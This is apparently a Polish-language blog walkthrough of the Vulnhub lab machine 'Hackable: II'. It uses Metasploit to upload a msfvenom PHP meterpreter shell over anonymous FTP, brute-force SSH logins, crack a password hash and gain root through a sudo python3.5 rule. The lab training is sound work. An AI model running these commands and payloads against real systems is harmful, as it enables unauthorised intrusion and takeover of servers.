---
title: "Hackable: II"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough  
tags:
  - Hacking
  - Vulnhub
  - Hackable
  - Walkthrough  
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Hackable: II
Write-up is in Polish language.

# Metainfo

|:----|:----|
|Nazwa:|Hackable: II|
|Autor:|[Elias-sousa](https://www.vulnhub.com/author/elias-sousa,804/)|
|Wypuszczony:|15.06.2021|
|Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/hackable-ii,711) - Vulnhub|
|Poziom:|Łatwy|
|Nauczysz się:|Metasploit i moduły|

# Wstęp
[Hackable: II](https://www.vulnhub.com/entry/hackable-ii,711) [autora](https://www.vulnhub.com/author/elias-sousa,804/) jest bardzo prostą maszyną do złamania, nawet prostszą niż wcześniej opisywany [Hackathonctf-1](https://kerszl.github.io/hacking/hackathonctf-1/). Dzisiaj oprzemy się głównie na Metasploicie, a z dodatkowych narzędzi postaramy się korzystać jak najmniej. Ten tutorial jest skierowany do bardzo początkujących. Jeżeli przejdziesz tę maszynę z pomocą tego wpisu, spróbuj jeszcze raz, tylko już samodzielnie.
{: .text-justify}
## Zaczynamy:
Tradycyjnie odpalamy **Metasploita**. Zakładam, że baza **Metasploita** na **Postgresie** jest już utworzona. to jest potrzebne, żeby zapisywać nasze wyniki. Inaczej nie stworzymy obszaru roboczego:
{: .text-justify}
```bash
msf6 > workspace -a hackable2
[*] Added workspace: hackable2
[*] Workspace: hackable2
msf6 >
```
Skanujemy naszą maszynkę:
{: .text-justify}
```bash
msf6 > db_nmap -A -p- 172.16.1.244
..........
..........
msf6 > services
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
172.16.1.244  21    tcp    ftp   open   ProFTPD
172.16.1.244  22    tcp    ssh   open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 Ubuntu Linux; protocol 2.0
172.16.1.244  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)
```
Widać 3 otwarte porty. Sprawdźmy czy można wejść na **FTP** przez **Anonymous**:
{: .text-justify}
```bash
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set rhosts 172.16.1.244
rhosts => 172.16.1.244
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 172.16.1.244:21       - 172.16.1.244:21 - Anonymous READ/WRITE (220 ProFTPD Server (ProFTPD Default Installation) [172.16.1.244])
[*] 172.16.1.244:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Można wejść. Na **FTP** jest plik **CALL.html**, można też wrzucać swoje pliki, więc mamy podatność.
{: .text-justify}
```
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
```
**SSH** nie skanujemy. Na **WWW** jest strona z konfiguracją **Apache**.
![apache](/assets/images/hacking/2021/05/01.png)
Tak, jak wspomniałem wcześniej, wykorzystujemy na maksa **Metasploit**a, więc użyjmy plugin **Wmap** do przeskanowania stronki:
{: .text-justify}
```bash
msf6 auxiliary(scanner/ftp/anonymous) > load wmap

.-.-.-..-.-.-..---..---.
| | | || | | || | || |-'
`-----'`-'-'-'`-^-'`-'
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
msf6 auxiliary(scanner/ftp/anonymous) > wmap_sites -a http://172.16.1.244
[*] Site created.
msf6 auxiliary(scanner/ftp/anonymous) >
msf6 auxiliary(scanner/ftp/anonymous) > wmap_run -e
[*] Using ALL wmap enabled modules.
[-] NO WMAP NODES DEFINED. Executing local modules
[*] Testing target:
[*]     Site: 172.16.1.244 (172.16.1.244)
[*]     Port: 80 SSL: false
..........
..........
```
Zobaczmy co nam **Wmap** znalazł:
{: .text-justify}
```bash
msf6 auxiliary(scanner/ftp/anonymous) > wmap_vulns -l
[*] + [172.16.1.244] (172.16.1.244): scraper /
[*]     scraper Scraper
[*]     GET Apache2 Ubuntu Default Page: It works
[*] + [172.16.1.244] (172.16.1.244): directory /files/
[*]     directory Directory found.
[*]     GET Res code: 404
[*] + [172.16.1.244] (172.16.1.244): directory /icons/
[*]     directory Directory found.
[*]     GET Res code: 403
[*] + [172.16.1.244] (172.16.1.244): file /index.html
[*]     file File found.
[*]     GET Res code: 404
[*] + [172.16.1.244] (172.16.1.244): file /files
[*]     file File found.
[*]     GET Res code: 301
```
Voilà – jest katalog **files**, a w nim plik **CALL.html**, tak jak na było **FTP**. To jest to samo, tylko widoczne z innych źródeł. Wchodząc na **http://172.16.1.244/files/CALL.html** nic ciekawego nie znajdziemy, chociaż w tytule strony jest **onion**. Nazwa nam nic nie mówi. Jednak wychodzi, że strona **WWW** jest powiązana z **FTP**. Przez **FTP** wrzucamy plik, a przez **WWW** go odpalamy. Oczywiście do tego użyjemy **Metasploit**a (oprócz wrzutki przez **FTP**). Najlepsze ładunki są z ładunkiem **Meterpreter**a, więc ich szukajmy:
{: .text-justify}
```bash
# root@kali:~# msfvenom -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_bind_tcp.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1338 bytes
```
Jeżeli nam **windows** wykryje, że ten ładunek to wirus, to należy go zaciemnić i potem wyedytować plik: na początku dodać **<?php**, na końcu **?>**
{: .text-justify}
{: .notice--danger}
```bash
# root@kali:~# msfvenom -e php/base64 -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_bind_tcp.php
```
Do katalogu **files** wrzucamy **php_meterpreter_bind_tcp.php**, ale zanim odświeżymy i uruchomimy na stronie, to załadujmy nasz ładunek i exploita w Msfconsole:
{: .text-justify}
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/bind_tcp
payload => php/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set lport 5555
lport => 5555
msf6 exploit(multi/handler) > set rhost 172.16.1.244
rhost => 172.16.1.244
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  5555             yes       The listen port
   RHOST  172.16.1.244     no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) >
[*] Started bind TCP handler against 172.16.1.244:5555
[*] Sending stage (39282 bytes) to 172.16.1.244
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.244:5555) at 2021-07-29 21:39:28 +0200
sessions

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         meterpreter php/linux  www-data (33) @ ubuntu  0.0.0.0:0 -> 172.16.1.244:5555 (172.16.1.244)
```
Najlepiej użyć tego samego ładunku do **Metasploit**a i ten, co wrzucamy na atakowany serwer. (Zadanie dla czytelnika. Spróbuj sam stworzyć ładunek i się połączyć, ale tym razem przez payload/php/meterpreter_reverse_tcp). 
{: .text-justify}
{: .notice--success}
Mamy sesję i możemy eksplorować podatny serwer. Teraz użyjemy modułów powłamaniowych, żeby ściągnąć trochę informacji na nasz komputer. Użyjemy dwóch modułów:
{: .text-justify}
- post/linux/gather/enum_system
- post/linux/gather/enum_users_history

```bash
msf6 exploit(multi/handler) > use post/linux/gather/enum_system
msf6 post(linux/gather/enum_system) > show options

Module options (post/linux/gather/enum_system):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf6 post(linux/gather/enum_system) > set session 1
session => 1
msf6 post(linux/gather/enum_system) > run

[!] SESSION may not be compatible with this module (missing Meterpreter features: core commands)
[+] Info:
[+]     Ubuntu 16.04.7 LTS
[+]     Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[+]     Module running as "www-data" user
[*] Linux version stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_823874.txt
[*] User accounts stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_792608.txt
[*] Installed Packages stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_940047.txt
[*] Running Services stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_790666.txt
[*] Cron jobs stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_485080.txt
[*] Disk info stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_296708.txt
[*] Logfiles stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_341841.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_709424.txt
[*] CPU Vulnerabilities stored in /root/.msf4/loot/20210729214802_default_172.16.1.244_linux.enum.syste_388295.txt
[*] Post module execution completed
msf6 post(linux/gather/enum_system) > loot
```
komenda **loot** pozwala nam wyświetlić, to co ściągnęliśmy.
{: .text-justify}
w pliku **20210729214957_default_172.16.1.244_linux.enum.syste_656649.txt** mamy użytkowników z podatnej maszyny
{: .notice--info}
moduł **post/linux/gather/enum_users_history** sciagnie nam plik **Sudoers**
{: .notice--info}
Moduł **auxiliary/scanner/ssh/ssh_login** pozwala nam dosyć pobieżnie przeskanować użytkowników i przy okazji ustawić sesję, jeżeli login i hasło będą poprawnę. Również może się przydać do ustawienia sesji w **Metasploicie**, jeżeli znamy tylko login i hasło. Sprawdźmy czy użytkownicy mają jakieś słabe hasła na systemie. Niestety ten moduł jest dosyć wolny, ale może coś znajdziemy. W parametrach podajemy, żeby używał hasła jako loginu, również podajemy ścieżkę do pliku gdzie zostali zapisani użytkownicy z obrazu **hackable II**. **Verbose** należy ustawić na _yes_, wtedy widać na bieżąco pracę modułu.
{: .text-justify}
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 172.16.1.244:22 - Starting bruteforce
[-] 172.16.1.244:22 - Failed: 'root:root'
[!] No active DB -- Credential data will not be saved!
[-] 172.16.1.244:22 - Failed: 'root:'
[-] 172.16.1.244:22 - Failed: 'daemon:daemon'
[-] 172.16.1.244:22 - Failed: 'daemon:'
[-] 172.16.1.244:22 - Failed: 'bin:bin'
[-] 172.16.1.244:22 - Failed: 'bin:'
[-] 172.16.1.244:22 - Failed: 'sys:sys'
[-] 172.16.1.244:22 - Failed: 'sys:'
[-] 172.16.1.244:22 - Failed: 'sync:sync'
[-] 172.16.1.244:22 - Failed: 'sync:'
[-] 172.16.1.244:22 - Failed: 'games:games'
[-] 172.16.1.244:22 - Failed: 'games:'
[-] 172.16.1.244:22 - Failed: 'man:man'
[-] 172.16.1.244:22 - Failed: 'man:'
[-] 172.16.1.244:22 - Failed: 'lp:lp'
[-] 172.16.1.244:22 - Failed: 'lp:'
[-] 172.16.1.244:22 - Failed: 'mail:mail'
[-] 172.16.1.244:22 - Failed: 'mail:'
[-] 172.16.1.244:22 - Failed: 'news:news'
[-] 172.16.1.244:22 - Failed: 'news:'
[-] 172.16.1.244:22 - Failed: 'uucp:uucp'
[-] 172.16.1.244:22 - Failed: 'uucp:'
[-] 172.16.1.244:22 - Failed: 'proxy:proxy'
[-] 172.16.1.244:22 - Failed: 'proxy:'
[-] 172.16.1.244:22 - Failed: 'www-data:www-data'
[-] 172.16.1.244:22 - Failed: 'www-data:'
[-] 172.16.1.244:22 - Failed: 'backup:backup'
[-] 172.16.1.244:22 - Failed: 'backup:'
[-] 172.16.1.244:22 - Failed: 'list:list'
[-] 172.16.1.244:22 - Failed: 'list:'
[-] 172.16.1.244:22 - Failed: 'irc:irc'
[-] 172.16.1.244:22 - Failed: 'irc:'
[-] 172.16.1.244:22 - Failed: 'gnats:gnats'
[-] 172.16.1.244:22 - Failed: 'gnats:'
[-] 172.16.1.244:22 - Failed: 'nobody:nobody'
[-] 172.16.1.244:22 - Failed: 'nobody:'
[-] 172.16.1.244:22 - Failed: 'systemd-timesync:systemd-timesync'
[-] 172.16.1.244:22 - Failed: 'systemd-timesync:'
[-] 172.16.1.244:22 - Failed: 'systemd-network:systemd-network'
[-] 172.16.1.244:22 - Failed: 'systemd-network:'
[-] 172.16.1.244:22 - Failed: 'systemd-resolve:systemd-resolve'
[-] 172.16.1.244:22 - Failed: 'systemd-resolve:'
[-] 172.16.1.244:22 - Failed: 'systemd-bus-proxy:systemd-bus-proxy'
[-] 172.16.1.244:22 - Failed: 'systemd-bus-proxy:'
[-] 172.16.1.244:22 - Failed: 'syslog:syslog'
[-] 172.16.1.244:22 - Failed: 'syslog:'
[-] 172.16.1.244:22 - Failed: '_apt:_apt'
[-] 172.16.1.244:22 - Failed: '_apt:'
[-] 172.16.1.244:22 - Failed: 'lxd:lxd'
[-] 172.16.1.244:22 - Failed: 'lxd:'
[-] 172.16.1.244:22 - Failed: 'messagebus:messagebus'
[-] 172.16.1.244:22 - Failed: 'messagebus:'
[-] 172.16.1.244:22 - Failed: 'uuidd:uuidd'
[-] 172.16.1.244:22 - Failed: 'uuidd:'
[-] 172.16.1.244:22 - Failed: 'dnsmasq:dnsmasq'
[-] 172.16.1.244:22 - Failed: 'dnsmasq:'
[-] 172.16.1.244:22 - Failed: 'shrek:shrek'
[-] 172.16.1.244:22 - Failed: 'shrek:'
[+] 172.16.1.244:22 - Success: 'ftp:ftp' 'Could not chdir to home directory /home/ftp: No such file or directory uid=1001(ftp) gid=1001(ftp) groups=1001(ftp) Could not chdir to home directory /home/ftp: No such file or directory Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 7 opened (172.16.1.10:39345 -> 172.16.1.244:22) at 2021-07-29 20:06:46 +0200
[-] 172.16.1.244:22 - Failed: 'colord:colord'
[-] 172.16.1.244:22 - Failed: 'colord:'
[-] 172.16.1.244:22 - Failed: 'sshd:sshd'
[-] 172.16.1.244:22 - Failed: 'sshd:'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
## Wchodzimy na serwer
Użytkownik **ftp** ma hasło **ftp** :smiley: Mamy też na to sesję. Żeby połączyć się z wygodnym **Meterpreterem** użyjemy modułu **multi/manage/shell_to_meterpreter**. W module wpisujemy nr sesji. Teraz już zwykłe szukanie dziury w całym… ;) W katalogu **/home** jest plik **important.txt**. W nim zaś zawartość:
{: .text-justify}
<div class="notice--primary" markdown="1">
important.txt
<pre>
<p style="background-color:white;">
run the script to see the data

/.runme.sh
</p>
</pre>
</div>
Zobaczmy co to za plik:
{: .text-justify}
<div class="notice--primary" markdown="1">
.runme.sh
<pre>
<p style="background-color:white;">
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'restarting computer in 3 seconds...'
sleep 1
echo 'restarting computer in 2 seconds...'
sleep 1
echo 'restarting computer in 1 seconds...'
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d'
</p>
</pre>
</div>
Na samym dole jest hasło. **Hashcat** i słownik **rockyou.txt** szybko się z nim uporają. Hasło to **onion**, ale przecież to było w tytule strony **http://172.16.1.244/files/CALL.html**. Proste maszyny do złamania czasami są bardzo proste.
{: .text-justify}
Wchodzimy na konto **shrek**a.
```bash
# cat user.txt
```
Wyświetli się obrazek (sam zobacz jaki :smiley: ). Jeszcze zostało wejść na **root**a. Mamy plik **Sudoers**, a tam jest taka ciekawa linijka:
{: .text-justify}
<div class="notice--primary" markdown="1">
Sudoers
<pre>
<p style="background-color:white;">
...
%shrek ALL = NOPASSWD:/usr/bin/python3.5
...
</p>
</pre>
</div>
Program python3.5 ma uprawnienia **root**a, ale tylko z grupy **shrek**. Trzeba to wykorzystać.
{: .text-justify}
```
-rwxr-xr-x 2 root root 4460304 Oct  9  2020 /usr/bin/python3.5
```
Najpierw należy się połączyć na sesję nr 10. Tam wpisujemy **shell**. Bez **Shell**a nie odpali się nam **Sudo**:
{: .text-justify}
```bash
  Id  Name  Type         Information                        Connection
  --  ----  ----         -----------                        ----------
  2         shell linux  SSH ftp:ftp (172.16.1.244:22)      172.16.1.10:41053 -> 172.16.1.244:22 (172.16.1.244)
  10        shell linux  SSH shrek:onion (172.16.1.244:22)  172.16.1.10:44865 -> 172.16.1.244:22 (172.16.1.244)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions 10
[*] Starting interaction with 10...
```
```bash
sudo: no tty present and no askpass program specified
shell

[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash

root@ubuntu:~# sudo python3.5 -c 'import os; os.system("/bin/bash");'
sudo python3.5 -c 'import os; os.system("/bin/bash");'
root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cat /root/root.txt
```
Wyświetli się obrazek. Jednak wolałbym użyć dodatkowych narzędzi, ale chciałem pokazać siłę **Metasploit**a. Jeżeli się podobał wpis napisz na [kerszi@protonmail.com](mailto:kerszi@protonmail.com) lub skomentuj (jeżeli się da). 
{: .text-justify}
